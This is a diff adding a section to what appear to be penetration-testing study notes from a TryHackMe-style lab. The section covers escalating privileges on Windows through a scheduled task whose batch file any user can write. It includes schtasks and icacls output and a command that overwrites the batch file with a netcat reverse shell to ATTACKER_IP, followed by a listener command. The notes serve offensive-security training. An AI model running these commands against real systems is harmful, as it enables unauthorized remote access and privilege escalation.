@@ -107,9 +107,42 @@ End of search: 10 match(es) found.
 * Any software that stores passwords (browsers, email clients, FTP clients, SSH clients VNC software) may have methods to recover passwords saved by the user.
 
 # Other Quick Wins
-* 
-## Sheduled Tasks
+* Some misconfigurations can allow higher privileged user access to be obtained.
 
+## Sheduled Tasks
+* May find a scheduled task that either lost its binary or is using a binary that can be modified.
+* Use `schtasks` to list sheduled tasks.
+* Detailed information can be retrieved about any of the services.
+```
+schtasks /query /tn vulntask /fo list /v
+Folder: \
+HostName:                             THM-PC1
+TaskName:                             \vulntask
+Task To Run:                          C:\tasks\schtask.bat
+Run As User:                          taskusr1
+``` 
+* `Task to Run` parameter indicates what gets executed by the scheduled task.
+* `Run as User` parameter shows the user that will execute the task.
+* What gets executed by the "Run as User" can be controlled if current user can modify "Task to Run".
+  * Results in simple privilege escalation.
+* Check File permissions on executable.
+```
+icacls c:\tasks\schtask.bat
+c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
+                    BUILTIN\Administrators:(I)(F)
+                    BUILTIN\Users:(I)(F)
+```
+* `(F)` means full access over the binary.
+  * Can modify .bat and insert any payload.
+* Change bat file to spawn reverse shell.
+```
+echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
+```
+* Start listener on attacker machine.
+```
+nc -lvnp 4444
+```
+* 
 ## AlwaysInstallElevated
 
 # Abusing Service Misconfigurations
